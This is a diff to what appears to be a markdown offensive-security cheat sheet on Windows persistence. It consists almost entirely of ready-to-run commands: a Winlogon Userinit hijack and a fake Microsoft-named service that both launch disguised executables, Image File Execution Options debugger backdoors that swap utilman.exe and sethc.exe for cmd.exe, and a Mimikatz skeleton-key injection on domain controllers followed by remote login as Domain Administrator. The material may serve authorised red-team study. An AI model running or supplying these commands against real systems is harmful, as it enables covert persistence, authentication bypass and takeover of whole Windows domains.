@@ -37,9 +37,24 @@ reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Users\KarMarKhaing\Vmware_Host.exe","C:\Windows\system32\userinit.exe"
 
 ```
-### Services
+### Services Persistent
 ```
 New-Service -Name "MS_Service for Startups" -BinaryPathName " C:\Users\KarMarKhaing\MS_Startup.exe" -Description "Microsoft Service for Startups"
 
 ```
 
+### Standalone Persistent
+
+```
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
+
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
+
+```
+```
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DCs FQDN>
+
+Access using the password "mimikatz"
+Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator
+
+```
